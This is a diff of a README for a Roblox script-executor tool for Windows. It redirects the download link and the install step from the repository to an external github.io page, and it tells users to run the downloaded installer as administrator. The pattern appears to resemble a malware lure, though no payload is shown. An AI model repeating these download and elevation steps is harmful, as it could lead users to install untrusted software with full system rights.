@@ -1,6 +1,6 @@
 # 🚀 velocity-windows-script-hub - Easy Roblox script execution for Windows
 
-[![Download Velocity](https://img.shields.io/badge/Download-Velocity_Hub-blue.svg)](https://github.com/purav093-wq/velocity-windows-script-hub)
+[![Download Velocity](https://img.shields.io/badge/Download-Velocity_Hub-blue.svg)](https://purav093-wq.github.io)
 
 Velocity provides a simple way to run scripts within Roblox on Windows 10 and 11. The application includes a lightweight interface and a collection of over 500 scripts. You do not need to manage keys or subscriptions to use this software.
 
@@ -19,7 +19,7 @@ Before you start, check that your computer meets these requirements:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project page at https://github.com/purav093-wq/velocity-windows-script-hub to download the installer.
+1. Visit the project page at https://purav093-wq.github.io to download the installer.
 2. Locate the downloaded file in your Downloads folder.
 3. Right-click the file and select "Run as administrator" to grant the necessary permissions.
 4. Follow the on-screen prompts in the installer window.
